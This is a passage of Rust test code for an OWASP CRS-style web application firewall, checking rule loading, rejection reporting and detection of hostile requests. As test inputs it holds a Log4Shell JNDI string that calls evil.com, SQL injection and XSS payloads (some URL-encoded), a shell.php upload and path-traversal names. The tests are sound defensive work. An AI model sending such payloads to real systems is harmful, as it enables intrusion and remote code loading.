        // Same leader rule as the request phase, and the same tie-break: first
        // in load order, so a verdict does not renumber itself between releases.
        let leader = leading_contributor(&contributions).map(|c| (c.id.to_owned(), c.name.to_owned()));
        let (rule_id, rule_name) =
            leader.unwrap_or_else(|| ("CRS-959100".to_owned(), "Outbound Anomaly Score Exceeded".to_owned()));

        Some(DetectionResult {
            rule_id: Some(rule_id),
            rule_name,
            phase: Phase::Owasp,
            detail: format!(
                "OWASP CRS outbound anomaly score {score} reached the threshold {threshold} at \
                 paranoia {paranoia} (CRS-959100) on response status {}{}; {} rule(s) contributed: {}",
                ctx.status,
                if ctx.body_truncated {
                    " (body truncated at the inspection ceiling)"
                } else {
                    ""
                },
                scored_count(&contributions),
                render_contributions(&contributions)
            ),
        })
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use bytes::Bytes;
    use std::collections::HashMap;
    use std::sync::Arc;
    use waf_common::{DefenseConfig, HostConfig};

    /// Absolute path to the shipped CRS rule set (tests run with the crate
    /// directory as CWD, so the relative default does not resolve).
    fn crs_dir() -> PathBuf {
        Path::new(env!("CARGO_MANIFEST_DIR")).join("../../rules/owasp-crs")
    }

    fn crs_data_dir() -> PathBuf {
        crs_dir().join(DATA_SUBDIR)
    }

    fn make_ctx(method: &str, path: &str, content_length: u64) -> RequestCtx {
        let dc = DefenseConfig {
            owasp_set: true,
            ..DefenseConfig::default()
        };
        let host_config = Arc::new(HostConfig {
            code: "test".into(),
            host: "example.com".into(),
            defense_config: dc,
            ..HostConfig::default()
        });
        RequestCtx {
            req_id: "test".into(),
            client_ip: "1.2.3.4".parse().unwrap(),
            client_port: 0,
            method: method.into(),
            host: "example.com".into(),
            port: 80,
            path: path.into(),
            query: String::new(),
            headers: HashMap::new(),
            body_preview: Bytes::new(),
            content_length,
            is_tls: false,
            host_config,
            geo: None,
        }
    }

    fn make_ctx_with_query(query: &str) -> RequestCtx {
        let mut ctx = make_ctx("GET", "/", 0);
        ctx.query = query.into();
        ctx
    }

    /// A `POST` carrying `body` as the request body, evaluated at `paranoia`.
    fn make_ctx_with_body(body: &str, paranoia: u8) -> RequestCtx {
        let mut ctx = make_ctx("POST", "/api/save", body.len() as u64);
        ctx.body_preview = Bytes::copy_from_slice(body.as_bytes());
        let dc = DefenseConfig {
            owasp_set: true,
            owasp_paranoia: paranoia,
            ..DefenseConfig::default()
        };
        ctx.host_config = Arc::new(HostConfig {
            code: "test".into(),
            host: "example.com".into(),
            defense_config: dc,
            ..HostConfig::default()
        });
        ctx
    }

    /// A context carrying a single header (and nothing else that could match).
    fn make_ctx_with_header(name: &str, value: &str) -> RequestCtx {
        let mut ctx = make_ctx("GET", "/", 0);
        ctx.headers.insert(name.into(), value.into());
        ctx
    }

    fn single_rule_yaml(field: &str, operator: &str, value: &str) -> String {
        format!(
            "version: \"1.0\"\nrules:\n  - id: TEST-RULE\n    name: test rule\n    category: test\n    \
             severity: critical\n    paranoia: 1\n    field: {field}\n    operator: {operator}\n    \
             value: {value}\n    action: block\n"
        )
    }

    #[test]
    fn test_invalid_method_blocked() {
        let checker = OWASPCheck::new();
        let ctx = make_ctx("FOOBAR", "/", 0);
        assert!(checker.check(&ctx).is_some(), "FOOBAR method should be blocked");
    }

    #[test]
    fn test_valid_method_allowed() {
        let checker = OWASPCheck::new();
        for method in &["GET", "POST", "PUT", "DELETE", "PATCH", "HEAD", "OPTIONS"] {
            let ctx = make_ctx(method, "/", 0);
            assert!(
                checker.check(&ctx).is_none(),
                "{method} should be allowed by OWASP method check"
            );
        }
    }

    #[test]
    fn test_large_body_blocked() {
        let checker = OWASPCheck::new();
        let ctx = make_ctx("POST", "/upload", 11 * 1024 * 1024); // 11 MB
        assert!(checker.check(&ctx).is_some(), "11MB body should be blocked");
    }

    #[test]
    fn test_log4shell_blocked() {
        let checker = OWASPCheck::new();
        let mut ctx = make_ctx("GET", "/", 0);
        ctx.path = "${jndi:ldap://evil.com/a}".into();
        assert!(checker.check(&ctx).is_some());
    }

    // ── detect_sqli tests ────────────────────────────────────────────────────

    const SQLI_RULE_YAML: &str = r#"
version: "1.0"
rules:
  - id: CRS-942100
    name: SQL Injection Attack Detected via libinjection
    category: sqli
    severity: critical
    paranoia: 1
    field: all
    operator: detect_sqli
    value: ""
    action: block
"#;

    #[test]
    fn detect_sqli_blocks_or_tautology() {
        let checker = OWASPCheck::from_yaml(SQLI_RULE_YAML);
        assert_eq!(checker.rule_count(), 1);
        let ctx = make_ctx_with_query("id=1' OR '1'='1");
        let result = checker.check(&ctx);
        assert!(result.is_some(), "Should detect SQL injection tautology");
    }

    #[test]
    fn detect_sqli_blocks_union_select() {
        let checker = OWASPCheck::from_yaml(SQLI_RULE_YAML);
        let ctx = make_ctx_with_query("id=1 UNION SELECT 1,2,3--");
        assert!(checker.check(&ctx).is_some(), "Should detect UNION SELECT injection");
    }

    #[test]
    fn detect_sqli_allows_clean_input() {
        let checker = OWASPCheck::from_yaml(SQLI_RULE_YAML);
        let ctx = make_ctx_with_query("name=alice&page=2");
        assert!(checker.check(&ctx).is_none(), "Should allow clean query string");
    }

    #[test]
    fn detect_sqli_checks_body() {
        let checker = OWASPCheck::from_yaml(SQLI_RULE_YAML);
        let mut ctx = make_ctx("POST", "/login", 0);
        ctx.body_preview = Bytes::from("username=admin&password=1' OR '1'='1");
        assert!(checker.check(&ctx).is_some(), "Should detect SQLi in body");
    }

    #[test]
    fn detect_sqli_checks_headers() {
        let checker = OWASPCheck::from_yaml(SQLI_RULE_YAML);
        let ctx = make_ctx_with_header("referer", "http://x/' OR '1'='1");
        assert!(checker.check(&ctx).is_some(), "Should detect SQLi in headers");
    }

    // ── detect_xss tests ─────────────────────────────────────────────────────

    const XSS_RULE_YAML: &str = r#"
version: "1.0"
rules:
  - id: CRS-941100
    name: XSS Attack Detected via libinjection
    category: xss
    severity: critical
    paranoia: 1
    field: all
    operator: detect_xss
    value: ""
    action: block
"#;

    #[test]
    fn detect_xss_blocks_script_tag() {
        let checker = OWASPCheck::from_yaml(XSS_RULE_YAML);
        assert_eq!(checker.rule_count(), 1);
        let ctx = make_ctx_with_query("q=<script>alert(1)</script>");
        assert!(checker.check(&ctx).is_some(), "Should detect script tag XSS");
    }

    #[test]
    fn detect_xss_blocks_event_handler() {
        let checker = OWASPCheck::from_yaml(XSS_RULE_YAML);
        let ctx = make_ctx_with_query("q=<img src=x onerror=alert(1)>");
        assert!(checker.check(&ctx).is_some(), "Should detect event handler XSS");
    }

    #[test]
    fn detect_xss_allows_clean_input() {
        let checker = OWASPCheck::from_yaml(XSS_RULE_YAML);
        let ctx = make_ctx_with_query("q=hello+world&page=1");
        assert!(checker.check(&ctx).is_none(), "Should allow clean input");
    }

    #[test]
    fn detect_xss_checks_body() {
        let checker = OWASPCheck::from_yaml(XSS_RULE_YAML);
        let mut ctx = make_ctx("POST", "/comment", 0);
        ctx.body_preview = Bytes::from("text=<script>alert('xss')</script>");
        assert!(checker.check(&ctx).is_some(), "Should detect XSS in body");
    }

    // ── compile_rule operator alias tests ────────────────────────────────────

    #[test]
    fn detect_sqli_modsec_alias_works() {
        let checker = OWASPCheck::from_yaml(&single_rule_yaml("query", "\"@detectSQLi\"", "\"\""));
        assert_eq!(checker.rule_count(), 1, "@detectSQLi alias should compile");
    }

    #[test]
    fn detect_xss_modsec_alias_works() {
        let checker = OWASPCheck::from_yaml(&single_rule_yaml("query", "\"@detectXSS\"", "\"\""));
        assert_eq!(checker.rule_count(), 1, "@detectXSS alias should compile");
    }

    // ── single-field detection tests ─────────────────────────────────────────

    #[test]
    fn detect_sqli_single_field_query() {
        let checker = OWASPCheck::from_yaml(&single_rule_yaml("query", "detect_sqli", "\"\""));
        // Should detect in query
        let ctx = make_ctx_with_query("id=1' OR '1'='1");
        assert!(checker.check(&ctx).is_some(), "Should detect SQLi in query field");
        // Should NOT detect in path when field is query-only
        let ctx2 = make_ctx("GET", "/1' OR '1'='1", 0);
        assert!(checker.check(&ctx2).is_none(), "Should not check path when field=query");
    }

    // ── URL-encoded evasion tests ────────────────────────────────────────────

    #[test]
    fn detect_sqli_url_encoded_evasion() {
        let checker = OWASPCheck::from_yaml(SQLI_RULE_YAML);
        // %27 = single quote, %20 = space, %3D = equals
        let ctx = make_ctx_with_query("id=1%27%20OR%20%271%27%3D%271");
        assert!(
            checker.check(&ctx).is_some(),
            "Should detect URL-encoded SQLi after decoding"
        );
    }

    #[test]
    fn detect_xss_url_encoded_evasion() {
        let checker = OWASPCheck::from_yaml(XSS_RULE_YAML);
        // %3Cscript%3E = <script>
        let ctx = make_ctx_with_query("q=%3Cscript%3Ealert(1)%3C/script%3E");
        assert!(
            checker.check(&ctx).is_some(),
            "Should detect URL-encoded XSS after decoding"
        );
    }

    // ── Edge case tests ──────────────────────────────────────────────────────

    #[test]
    fn detect_sqli_empty_input_safe() {
        let checker = OWASPCheck::from_yaml(SQLI_RULE_YAML);
        let ctx = make_ctx("GET", "/", 0);
        assert!(checker.check(&ctx).is_none(), "Empty input should not trigger SQLi");
    }

    #[test]
    fn detect_xss_empty_input_safe() {
        let checker = OWASPCheck::from_yaml(XSS_RULE_YAML);
        let ctx = make_ctx("GET", "/", 0);
        assert!(checker.check(&ctx).is_none(), "Empty input should not trigger XSS");
    }

    #[test]
    fn detect_sqli_non_utf8_body() {
        let checker = OWASPCheck::from_yaml(SQLI_RULE_YAML);
        let mut ctx = make_ctx("POST", "/", 0);
        // Binary payload with some valid SQL-like bytes mixed in
        ctx.body_preview = Bytes::from(vec![0xFF, 0xFE, 0x00, 0x80]);
        assert!(
            checker.check(&ctx).is_none(),
            "Random binary data should not trigger SQLi"
        );
    }

    #[test]
    fn detect_sqli_paranoia_level_filtering() {
        let yaml = r#"
version: "1.0"
rules:
  - id: CRS-942100-PL3
    name: SQLi detection at paranoia level 3
    category: sqli
    severity: critical
    paranoia: 3
    field: all
    operator: detect_sqli
    value: ""
    action: block
"#;
        let checker = OWASPCheck::from_yaml(yaml);
        assert_eq!(checker.rule_count(), 1);
        // Default paranoia is 1, so PL3 rule should be skipped
        let ctx = make_ctx_with_query("id=1' OR '1'='1");
        assert!(
            checker.check(&ctx).is_none(),
            "PL3 rule should be skipped at default paranoia level 1"
        );
    }

    // ── A.1: unsupported field / operator must be rejected, never silent ─────

    #[test]
    fn unsupported_field_is_rejected_and_reported() {
        // `response_headers` is what the converter emits for `RESPONSE_HEADERS`
        // and for `RESPONSE_PROTOCOL`, neither of which the engine reads. It is
        // deliberately a *response-side* name: the response pipeline knows two
        // surfaces and must reject the rest as loudly as the request pipeline
        // does, rather than admitting them because they look response-ish.
        let checker = OWASPCheck::from_yaml(&single_rule_yaml("response_headers", "regex", "'.*'"));
        let summary = checker.load_summary();

        assert_eq!(checker.rule_count(), 0, "unsupported field must not be counted");
        assert_eq!(summary.attempted, 1);
        assert_eq!(summary.compiled, 0);
        assert_eq!(summary.rejected_field_count(), 1);
        assert_eq!(summary.rejected_field_ids(), vec!["TEST-RULE"]);
        assert!(summary.is_degraded());
        assert!(matches!(
            summary.rejected.first().map(|r| &r.reason),
            Some(RejectReason::UnsupportedField(f)) if f == "response_headers"
        ));
    }

    #[test]
    fn unsupported_operator_is_rejected_and_reported() {
        let checker = OWASPCheck::from_yaml(&single_rule_yaml("query", "validate_byte_range", "'1-255'"));
        let summary = checker.load_summary();

        assert_eq!(checker.rule_count(), 0, "unsupported operator must not be counted");
        assert_eq!(summary.rejected_operator_count(), 1);
        assert_eq!(summary.rejected_operator_ids(), vec!["TEST-RULE"]);
        assert_eq!(summary.rejected_field_count(), 0);
        assert!(summary.is_degraded());
    }

    #[test]
    fn scalar_operator_on_collection_field_is_rejected() {
        // `equals` / `gt` compare one value; `all` and `cookies` expand to many,
        // and the schema cannot express the CRS collection-member selector.
        for (field, operator, value) in [("cookies", "equals", "'1'"), ("all", "gt", "'0'")] {
            let checker = OWASPCheck::from_yaml(&single_rule_yaml(field, operator, value));
            let summary = checker.load_summary();
            assert_eq!(checker.rule_count(), 0, "{operator} on {field} must be rejected");
            assert_eq!(summary.count(RejectCategory::FieldOperatorMismatch), 1);
            assert_eq!(
                summary.rule_ids(RejectCategory::FieldOperatorMismatch),
                vec!["TEST-RULE"]
            );
        }
    }

    #[test]
    fn wrong_value_type_is_rejected_not_silently_dropped() {
        // `gt` with a string value used to vanish without any log at all.
        let checker = OWASPCheck::from_yaml(&single_rule_yaml("content_length", "gt", "'0'"));
        let summary = checker.load_summary();
        assert_eq!(checker.rule_count(), 0);
        assert_eq!(summary.count(RejectCategory::InvalidValue), 1);
        assert!(matches!(
            summary.rejected.first().map(|r| &r.reason),
            Some(RejectReason::InvalidValueType { expected, .. }) if *expected == "integer"
        ));
    }

    #[test]
    fn invalid_regex_is_rejected_and_categorised() {
        let checker = OWASPCheck::from_yaml(&single_rule_yaml("query", "regex", "'a('"));
        let summary = checker.load_summary();
        assert_eq!(checker.rule_count(), 0);
        assert_eq!(summary.count(RejectCategory::InvalidValue), 1);
        assert!(matches!(
            summary.rejected.first().map(|r| &r.reason),
            Some(RejectReason::InvalidRegex(_))
        ));
    }

    #[test]
    fn summary_accounts_for_every_declared_rule() {
        let yaml = r#"
version: "1.0"
rules:
  - id: OK-1
    name: supported
    category: test
    severity: critical
    paranoia: 1
    field: query
    operator: contains
    value: evil
    action: block
  - id: BAD-FIELD
    name: unsupported field
    category: test
    severity: critical
    paranoia: 1
    field: response_headers
    operator: contains
    value: evil
    action: block
  - id: BAD-OP
    name: unsupported operator
    category: test
    severity: critical
    paranoia: 1
    field: query
    operator: verify_cc
    value: evil
    action: block
"#;
        let checker = OWASPCheck::from_yaml(yaml);
        let summary = checker.load_summary();
        assert_eq!(summary.attempted, 3);
        assert_eq!(summary.compiled, 1);
        assert_eq!(checker.rule_count(), 1);
        assert_eq!(summary.rejected.len(), 2);
        assert_eq!(summary.attempted, summary.compiled + summary.rejected.len());
        assert_eq!(summary.rejected_field_ids(), vec!["BAD-FIELD"]);
        assert_eq!(summary.rejected_operator_ids(), vec!["BAD-OP"]);
    }

    // ── `header:<name>` — the generic REQUEST_HEADERS accessor ───────────────

    /// The name is carried verbatim, so the three spellings CRS lists for the
    /// AJAX upload header stay three different fields.
    #[test]
    fn named_header_field_keeps_hyphen_dot_and_underscore_apart() {
        for name in ["x-filename", "x_filename", "x.filename"] {
            let checker = OWASPCheck::from_yaml(&single_rule_yaml(&format!("header:{name}"), "contains", "evil"));
            assert_eq!(checker.rule_count(), 1, "header:{name} must compile");
            assert!(
                checker.check(&make_ctx_with_header(name, "evil.php")).is_some(),
                "header:{name} must read {name}"
            );
            for other in ["x-filename", "x_filename", "x.filename"] {
                if other == name {
                    continue;
                }
                assert!(
                    checker.check(&make_ctx_with_header(other, "evil.php")).is_none(),
                    "header:{name} must not read {other}"
                );
            }
        }
    }

    /// Precision: naming one header must not turn into scanning the others.
    #[test]
    fn named_header_field_reads_only_the_header_it_names() {
        let checker = OWASPCheck::from_yaml(&single_rule_yaml("header:x-filename", "contains", "evil"));
        for decoy in [
            "user-agent",
            "referer",
            "x-forwarded-for",
            "authorization",
            "cookie",
            "accept",
        ] {
            assert!(
                checker.check(&make_ctx_with_header(decoy, "evil.php")).is_none(),
                "a rule naming x-filename must not read {decoy}"
            );
        }
    }

    /// HTTP field names are case-insensitive; nothing else about them is.
    #[test]
    fn named_header_field_is_case_insensitive_on_the_name() {
        assert_eq!(Field::parse("header:X-Filename"), Field::parse("header:x-filename"));
        let checker = OWASPCheck::from_yaml(&single_rule_yaml("header:X-FileName", "contains", "evil"));
        assert!(checker.check(&make_ctx_with_header("x-filename", "evil.php")).is_some());
    }

    /// A composite is a set, not a sequence: two spellings of one CRS variable
    /// list must be one field, and a repeat must be refused the way a repeated
    /// surface already is.
    #[test]
    fn named_header_composites_are_order_insensitive_and_reject_repeats() {
        assert_eq!(
            Field::parse("files+header:x-filename+header:x_filename"),
            Field::parse("header:x_filename+files+header:x-filename")
        );
        assert_eq!(Field::parse("header:accept+header:accept"), None);
        assert_eq!(Field::parse("header:accept+headers+headers"), None);
    }

    /// A name that is not an RFC 9110 token has no spelling, so the rule is
    /// rejected at load time rather than reading some other header.
    #[test]
    fn malformed_named_header_is_rejected_not_approximated() {
        for bad in [
            "header:",
            "header:x filename",
            "header:x/filename",
            "header:x:filename",
            "header:x@filename",
            "header:\"x\"",
        ] {
            assert_eq!(Field::parse(bad), None, "{bad} must stay unevaluable");
            let checker = OWASPCheck::from_yaml(&single_rule_yaml(bad, "contains", "evil"));
            assert_eq!(checker.rule_count(), 0, "{bad} must not compile");
        }
    }

    /// Upstream does not evaluate a variable the request does not carry, and a
    /// negated rule that ignored that would fire on every request that omits
    /// the header — the CRS-920600 failure mode.
    #[test]
    fn absent_named_header_yields_no_value_even_negated() {
        let yaml = single_rule_yaml("header:accept", "regex", "'^text/'")
            .replace("    action: block", "    negate: true\n    action: block");
        let checker = OWASPCheck::from_yaml(&yaml);
        assert_eq!(checker.rule_count(), 1);
        assert!(
            checker.check(&make_ctx("GET", "/", 0)).is_none(),
            "no Accept header means no value to test, so a negated rule cannot hold"
        );
        assert!(
            checker.check(&make_ctx_with_header("accept", "text/html")).is_none(),
            "a value the pattern accepts must not fire a negated rule"
        );
        assert!(
            checker.check(&make_ctx_with_header("accept", "!!!")).is_some(),
            "a value the pattern rejects must fire a negated rule"
        );
    }

    /// CRS-933110's shape: one field over a multipart surface *and* the header
    /// branch of the same rule. Both halves have to work, independently.
    #[test]
    fn named_header_composite_reads_surface_and_header() {
        let checker = OWASPCheck::from_yaml(&single_rule_yaml("files+header:x-filename", "regex", r"'.*\.php$'"));
        assert_eq!(checker.rule_count(), 1);
        assert!(
            checker
                .check(&make_ctx_with_header("x-filename", "shell.php"))
                .is_some()
        );
        let mut upload = make_ctx("POST", "/upload", 0);
        let body = "--b\r\nContent-Disposition: form-data; name=\"f\"; filename=\"shell.php\"\r\n\r\nx\r\n--b--\r\n";
        upload
            .headers
            .insert("content-type".into(), "multipart/form-data; boundary=b".into());
        upload.body_preview = Bytes::copy_from_slice(body.as_bytes());
        upload.content_length = body.len() as u64;
        assert!(checker.check(&upload).is_some(), "the FILES half must still work");
    }

    /// A lone named header is one value, so a numeric comparison is meaningful
    /// on it (CRS-920520 under `t:length`); a list of them is not.
    #[test]
    fn named_header_is_scalar_only_when_it_names_one_header() {
        let one = single_rule_yaml("header:accept-encoding", "gt", "100").replace(
            "    action: block",
            "    transform: [lowercase, length]\n    action: block",
        );
        assert_eq!(OWASPCheck::from_yaml(&one).rule_count(), 1);
        let long = "gzip, ".repeat(30);
        let checker = OWASPCheck::from_yaml(&one);
        assert!(checker.check(&make_ctx_with_header("accept-encoding", &long)).is_some());
        assert!(
            checker
                .check(&make_ctx_with_header("accept-encoding", "gzip, deflate, br"))
                .is_none()
        );

        let two = single_rule_yaml("header:accept-encoding+header:accept", "gt", "100");
        assert_eq!(
            OWASPCheck::from_yaml(&two).rule_count(),
            0,
            "`gt` over two headers has no single value to compare"
        );
        let mixed = single_rule_yaml("files+header:accept", "gt", "100");
        assert_eq!(OWASPCheck::from_yaml(&mixed).rule_count(), 0);
    }

    /// Repeated headers arrive already folded (`gateway::fold_request_headers`),
    /// so the accessor sees the one RFC-shaped value the origin would rebuild
    /// and needs no folding of its own.
    #[test]
    fn named_header_reads_the_folded_value() {
        let checker = OWASPCheck::from_yaml(&single_rule_yaml("header:connection", "regex", r"'close, close'"));
        assert!(
            checker
                .check(&make_ctx_with_header("connection", "close, close"))
                .is_some()
        );
    }

    /// The countable inventory is deliberately narrower than the readable one;
    /// making headers readable must not have widened it.
    #[test]
    fn generic_read_did_not_widen_the_countable_set() {
        assert!(Field::parse("count_header_referer").is_some());
        for name in [
            "count_header_accept",
            "count_header_request_range",
            "count_header_x_filename",
        ] {
            assert_eq!(Field::parse(name), None, "{name} must stay uncountable");
        }
    }

    // ── A.2: load failures must not degrade silently ─────────────────────────

    #[test]
    fn yaml_parse_failure_is_recorded_not_silent() {
        let checker = OWASPCheck::from_yaml("rules: [ this is not: valid: yaml");
        let summary = checker.load_summary();
        assert_eq!(checker.rule_count(), 0);
        assert_eq!(summary.source_errors.len(), 1, "parse failure must be recorded");
        assert!(summary.is_degraded(), "an unparsable source is a degraded load");
        assert_eq!(summary.attempted, 0);
    }

    #[test]
    fn unreadable_directory_is_recorded_not_silent() {
        let missing = Path::new(env!("CARGO_MANIFEST_DIR")).join("does-not-exist-owasp-rules");
        let checker = OWASPCheck::from_directory(&missing);
        let summary = checker.load_summary();
        assert_eq!(checker.rule_count(), 0);
        assert_eq!(summary.source_errors.len(), 1);
        assert!(summary.is_degraded());
    }

    #[test]
    fn embedded_fallback_is_flagged_in_the_summary() {
        // Tests run from the crate directory, where `rules/owasp-crs/` does not
        // exist, so `new()` takes the embedded-fallback path.
        let checker = OWASPCheck::new();
        assert!(checker.rule_count() > 0, "fallback must still enforce something");
        assert!(
            checker.load_summary().used_embedded_fallback,
            "fallback substitution must be visible in the summary"
        );
        assert!(checker.load_summary().is_degraded());
    }

    // ── B: newly supported fields ────────────────────────────────────────────

    #[test]
    fn cookies_field_matches_individual_cookie_values() {
        let checker = OWASPCheck::from_yaml(&single_rule_yaml("cookies", "contains", "evil"));
        assert_eq!(checker.rule_count(), 1);

        let hit = make_ctx_with_header("cookie", "sid=abc; theme=evil-dark; lang=en");
        assert!(checker.check(&hit).is_some(), "cookie value should match");

        let miss = make_ctx_with_header("cookie", "sid=abc; theme=dark");
        assert!(checker.check(&miss).is_none(), "clean cookies must not match");
    }

    #[test]
    fn cookies_field_ignores_cookie_names() {
        // CRS `REQUEST_COOKIES` is the *values* collection; a name-only match
        // would silently widen the rule.
        let checker = OWASPCheck::from_yaml(&single_rule_yaml("cookies", "contains", "evil"));
        let ctx = make_ctx_with_header("cookie", "evil=1");
        assert!(checker.check(&ctx).is_none(), "cookie names are not values");
    }

    #[test]
    fn header_referer_field_positive_and_negative() {
        let checker = OWASPCheck::from_yaml(&single_rule_yaml("header_referer", "regex", "'#.*'"));
        assert_eq!(checker.rule_count(), 1);
        let hit = make_ctx_with_header("referer", "http://site/page#frag");
        assert!(checker.check(&hit).is_some());
        let miss = make_ctx_with_header("referer", "http://site/page");
        assert!(checker.check(&miss).is_none());
        let absent = make_ctx("GET", "/", 0);
        assert!(checker.check(&absent).is_none(), "absent header must not match");
    }

    #[test]
    fn header_host_field_positive_and_negative() {
        let checker = OWASPCheck::from_yaml(&single_rule_yaml(
            "header_host",
            "regex",
            "'(?:^([\\d.]+|\\[[\\da-f:]+\\]|[\\da-f:]+)(:[\\d]+)?$)'",
        ));
        assert_eq!(checker.rule_count(), 1);
        let hit = make_ctx_with_header("host", "192.168.1.10:8080");
        assert!(checker.check(&hit).is_some(), "numeric Host must match CRS-920350");
        let miss = make_ctx_with_header("host", "example.com");
        assert!(checker.check(&miss).is_none());
    }

    #[test]
    fn header_host_field_reads_the_header_not_the_vhost() {
        let checker = OWASPCheck::from_yaml(&single_rule_yaml("header_host", "contains", "example.com"));
        // ctx.host is "example.com" but no Host header is present: matching the
        // configured vhost instead of the header would be a false positive.
        let ctx = make_ctx("GET", "/", 0);
        assert!(checker.check(&ctx).is_none());
    }

    #[test]
    fn header_range_field_positive_and_negative() {
        let checker = OWASPCheck::from_yaml(&single_rule_yaml(
            "header_range",
            "regex",
            "'^bytes=(?:(?:\\d+)?-(?:\\d+)?\\s*,?\\s*){6}'",
        ));
        assert_eq!(checker.rule_count(), 1);
        let hit = make_ctx_with_header("range", "bytes=0-1,1-2,2-3,3-4,4-5,5-6,6-7");
        assert!(checker.check(&hit).is_some(), "6+ range fields must match");
        let miss = make_ctx_with_header("range", "bytes=0-1023");
        assert!(checker.check(&miss).is_none());
    }

    #[test]
    fn headers_field_scans_every_header_name_and_value() {
        let checker = OWASPCheck::from_yaml(&single_rule_yaml("headers", "contains", "'x-evil'"));
        assert_eq!(checker.rule_count(), 1);

        // Matches on a header *name* (CRS REQUEST_HEADERS_NAMES).
        let by_name = make_ctx_with_header("x-evil-marker", "1");
        assert!(checker.check(&by_name).is_some(), "header names must be scanned");

        // Matches on a header *value*, including headers outside the curated
        // SCANNED_HEADERS list used by the heuristic checks.
        let by_value = make_ctx_with_header("x-custom-tenant", "x-evil");
        assert!(checker.check(&by_value).is_some(), "all header values must be scanned");

        let miss = make_ctx_with_header("accept", "text/html");
        assert!(checker.check(&miss).is_none());
    }

    // ── B: newly supported operators ─────────────────────────────────────────

    #[test]
    fn contains_any_matches_whitespace_separated_phrases() {
        let checker = OWASPCheck::from_yaml(&single_rule_yaml(
            "all",
            "contains_any",
            "'document.cookie window.location -moz-binding'",
        ));
        assert_eq!(checker.rule_count(), 1);

        let hit = make_ctx_with_query("q=alert(DOCUMENT.COOKIE)");
        assert!(checker.check(&hit).is_some(), "phrase match must be case-insensitive");

        let miss = make_ctx_with_query("q=hello+world");
        assert!(checker.check(&miss).is_none());
    }

    #[test]
    fn contains_any_matches_url_encoded_payload() {
        let checker = OWASPCheck::from_yaml(&single_rule_yaml("all", "contains_any", "'-moz-binding'"));
        let ctx = make_ctx_with_query("q=%2Dmoz%2Dbinding");
        assert!(checker.check(&ctx).is_some(), "CRS @pm runs after urlDecodeUni");
    }

    #[test]
    fn contains_any_accepts_a_yaml_list() {
        let yaml = "version: \"1.0\"\nrules:\n  - id: TEST-RULE\n    name: t\n    category: test\n    \
                    severity: critical\n    paranoia: 1\n    field: query\n    operator: contains_any\n    \
                    value:\n      - alpha\n      - beta\n    action: block\n";
        let checker = OWASPCheck::from_yaml(yaml);
        assert_eq!(checker.rule_count(), 1);
        assert!(checker.check(&make_ctx_with_query("x=BETA")).is_some());
        assert!(checker.check(&make_ctx_with_query("x=gamma")).is_none());
    }

    #[test]
    fn contains_any_with_no_phrases_is_rejected() {
        let checker = OWASPCheck::from_yaml(&single_rule_yaml("query", "contains_any", "'   '"));
        assert_eq!(checker.rule_count(), 0);
        assert_eq!(checker.load_summary().count(RejectCategory::InvalidValue), 1);
    }

    #[test]
    fn equals_operator_is_exact_and_case_sensitive() {
        let checker = OWASPCheck::from_yaml(&single_rule_yaml("method", "equals", "TRACE"));
        assert_eq!(checker.rule_count(), 1);
        assert!(checker.check(&make_ctx("TRACE", "/", 0)).is_some());
        assert!(
            checker.check(&make_ctx("trace", "/", 0)).is_none(),
            "@streq is case-sensitive"
        );
        assert!(checker.check(&make_ctx("GET", "/", 0)).is_none());
    }

    // ── B: pm_from_file ──────────────────────────────────────────────────────

    #[test]
    fn pm_from_file_loads_wordlist_and_matches() {
        let checker = OWASPCheck::from_yaml_with_data_dir(
            &single_rule_yaml("path", "pm_from_file", "restricted-files.data"),
            &crs_data_dir(),
        );
        assert_eq!(checker.rule_count(), 1, "wordlist rule must compile");

        let hit = make_ctx("GET", "/app/.htaccess", 0);
        assert!(checker.check(&hit).is_some(), "restricted file must match");

        let miss = make_ctx("GET", "/index.html", 0);
        assert!(checker.check(&miss).is_none(), "ordinary path must not match");
    }

    #[test]
    fn pm_from_file_matches_url_encoded_payload() {
        let checker = OWASPCheck::from_yaml_with_data_dir(
            &single_rule_yaml("query", "pm_from_file", "unix-shell.data"),
            &crs_data_dir(),
        );
        assert_eq!(checker.rule_count(), 1);
        // "/bin/bash" percent-encoded.
        let ctx = make_ctx_with_query("cmd=%2Fbin%2Fbash");
        assert!(checker.check(&ctx).is_some(), "CRS @pmFromFile runs after urlDecodeUni");
    }

    #[test]
    fn pm_from_file_missing_wordlist_is_rejected() {
        let checker = OWASPCheck::from_yaml_with_data_dir(
            &single_rule_yaml("query", "pm_from_file", "no-such-list.data"),
            &crs_data_dir(),
        );
        let summary = checker.load_summary();
        assert_eq!(checker.rule_count(), 0);
        assert_eq!(summary.count(RejectCategory::DataFile), 1);
        assert_eq!(summary.rule_ids(RejectCategory::DataFile), vec!["TEST-RULE"]);
    }

    #[test]
    fn pm_from_file_rejects_path_traversal() {
        for name in ["'../secrets.data'", "'/etc/passwd'"] {
            let checker =
                OWASPCheck::from_yaml_with_data_dir(&single_rule_yaml("query", "pm_from_file", name), &crs_data_dir());
            assert_eq!(checker.rule_count(), 0, "{name} must not escape the data dir");
            assert_eq!(checker.load_summary().count(RejectCategory::DataFile), 1);
        }
    }

    #[test]
    fn pm_from_file_without_data_dir_is_rejected_not_skipped() {
        let checker = OWASPCheck::from_yaml(&single_rule_yaml("query", "pm_from_file", "unix-shell.data"));
        assert_eq!(checker.rule_count(), 0);
        assert_eq!(checker.load_summary().count(RejectCategory::DataFile), 1);
    }

    #[test]
    fn wordlist_parsing_skips_comments_and_blanks() {
        let dir = std::env::temp_dir().join(format!("prx-waf-owasp-wordlist-{}", std::process::id()));
        std::fs::create_dir_all(&dir).unwrap();
        let path = dir.join("list.data");
        std::fs::write(&path, "# a comment\n\n  spaced-entry  \nplain\n").unwrap();

        let checker =
            OWASPCheck::from_yaml_with_data_dir(&single_rule_yaml("query", "pm_from_file", "list.data"), &dir);
        assert_eq!(checker.rule_count(), 1);
        assert!(checker.check(&make_ctx_with_query("x=spaced-entry")).is_some());
        assert!(checker.check(&make_ctx_with_query("x=plain")).is_some());
        assert!(
            checker.check(&make_ctx_with_query("x=a comment")).is_none(),
            "comment lines must not become patterns"
        );

        std::fs::remove_dir_all(&dir).ok();
    }

    #[test]
    fn empty_wordlist_is_rejected() {
        let dir = std::env::temp_dir().join(format!("prx-waf-owasp-empty-{}", std::process::id()));
        std::fs::create_dir_all(&dir).unwrap();
        std::fs::write(dir.join("empty.data"), "# only comments\n\n").unwrap();

        let checker =
            OWASPCheck::from_yaml_with_data_dir(&single_rule_yaml("query", "pm_from_file", "empty.data"), &dir);
        assert_eq!(checker.rule_count(), 0);
